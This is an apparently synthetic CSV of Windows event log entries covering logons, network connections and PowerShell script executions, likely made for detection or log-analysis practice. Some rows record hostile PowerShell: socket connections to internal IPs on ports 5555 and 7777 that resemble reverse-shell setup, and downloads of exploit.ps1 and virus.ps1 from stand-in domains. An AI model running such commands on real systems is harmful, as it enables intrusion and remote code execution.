Timestamp,Level,Component,EventID,TargetUserName,IpAddress,WorkstationName,ProcessName,EventDescription,ScriptContent,SourcePort,DestinationPort
2025-05-16T02:30:25.456789,WARNING,CBS,4104,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('172.16.0.1',5555),-,-
2025-05-16T02:35:50.567890,INFO,CBS,5156,-,192.168.1.10,WKSTN01,-,Network Connection (RDP),-,54333,3389
2025-05-16T03:40:15.678901,WARNING,CBS,4625,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
2025-05-16T03:45:40.789012,INFO,CBS,4624,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
2025-05-16T04:50:05.890123,WARNING,CBS,4104,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-Command -ScriptBlock {Get-Service} -ComputerName SRV04,-,-
2025-05-16T04:55:30.901234,WARNING,CBS,5156,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54334,80
2025-05-16T05:00:55.012345,WARNING,CBS,4625,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
2025-05-16T05:05:20.123456,INFO,CBS,4624,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
2025-05-16T06:10:45.234567,INFO,CBS,4104,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-WmiObject -Class Win32_OperatingSystem,-,-
2025-05-16T06:15:10.345678,WARNING,CBS,5156,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54335,80
2025-05-16T07:20:35.456789,WARNING,CBS,4625,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
2025-05-16T07:25:00.567890,INFO,CBS,4624,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
2025-05-16T08:30:25.678901,WARNING,CBS,4104,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://hack.com/exploit.ps1 -OutFile C:\Temp\exploit.ps1,-,-
2025-05-16T08:35:50.789012,INFO,CBS,5156,-,192.168.1.10,WKSTN01,-,Network Connection (HTTP Request),-,54336,80
2025-05-16T09:40:15.890123,WARNING,CBS,4625,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
2025-05-16T09:45:40.901234,INFO,CBS,4624,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
2025-05-16T10:50:05.012345,INFO,CBS,4104,LocalUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4624},-,-
2025-05-16T10:55:30.123456,WARNING,CBS,5156,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54337,80
2025-05-16T11:00:55.234567,WARNING,CBS,4625,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
2025-05-16T11:05:20.345678,INFO,CBS,4624,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
2025-05-16T12:10:45.456789,WARNING,CBS,4104,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.2',7777),-,-
2025-05-16T12:15:10.567890,INFO,CBS,1,IEUser,-,SRV01,C:\Windows\System32\notepad.exe,Sysmon Process Create,C:\Windows\System32\notepad.exe,-,-
2025-05-16T13:20:35.678901,WARNING,CBS,5156,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54338,80
2025-05-16T13:25:00.789012,WARNING,CBS,4625,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
2025-05-16T14:30:25.890123,INFO,CBS,4624,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
2025-05-16T14:35:50.901234,WARNING,CBS,4104,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://malware.com/virus.ps1 -OutFile C:\Temp\virus.ps1,-,-
2025-05-16T15:40:15.012345,INFO,CBS,5156,-,192.168.1.10,WKSTN01,-,Network Connection (RDP),-,54339,3389
2025-05-16T15:45:40.123456,WARNING,CBS,4625,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
2025-05-16T16:50:05.234567,INFO,CBS,4624,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
2025-05-16T16:55:30.345678,WARNING,CBS,4104,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-Command -ScriptBlock {Get-Service} -ComputerName SRV04,-,-
2025-05-16T17:00:55.456789,WARNING,CBS,5156,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54334,80
2025-05-16T17:05:20.567890,WARNING,CBS,4625,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
2025-05-16T18:10:45.678901,INFO,CBS,4624,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
2025-05-16T18:15:10.789012,INFO,CBS,4104,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-WmiObject -Class Win32_OperatingSystem,-,-
2025-05-16T19:20:35.890123,WARNING,CBS,5156,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54335,80
2025-05-16T19:25:00.901234,WARNING,CBS,4625,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
2025-05-16T20:30:25.012345,INFO,CBS,4624,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
2025-05-16T20:35:50.123456,WARNING,CBS,4104,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://hack.com/exploit.ps1 -OutFile C:\Temp\exploit.ps1,-,-
2025-05-16T21:40:15.234567,INFO,CBS,5156,-,192.168.1.10,WKSTN01,-,Network Connection (HTTP Request),-,54336,80
2025-05-16T21:45:40.345678,WARNING,CBS,4625,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
2025-05-16T22:50:05.456789,INFO,CBS,4624,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
2025-05-16T22:55:30.567890,INFO,CBS,4104,LocalUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4624},-,-
2025-05-16T23:00:55.678901,WARNING,CBS,5156,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54337,80
